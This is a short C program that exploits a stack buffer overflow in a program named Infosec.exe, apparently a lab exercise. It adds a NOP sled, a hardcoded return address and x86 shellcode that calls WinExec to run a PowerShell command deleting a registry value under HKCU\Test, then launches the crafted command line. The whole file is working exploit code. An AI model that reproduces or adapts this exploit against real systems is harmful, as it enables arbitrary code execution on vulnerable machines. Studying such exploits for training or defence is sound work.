#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
int main (){
	char xp[200] = "Infosec.exe ";
	char of[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x3b\x93\x9F\x77\xeb\x16\x59\x31\xc0\x50\x51\xb8\x30\x52\x9e\x77\xff\xd0\x31\xc0\x50\xb8\x80\xf3\x9a\x77\xff\xd0\xe8\xe5\xff\xff\xff\"powershell -Command Remove-ItemProperty -Path  Registry::HKEY_CURRENT_USER\\Test\\ -Name Test\"";
	strcat(xp, of);
	printf("%s", xp);
	WinExec(xp, 1);
	// 779F933B
}
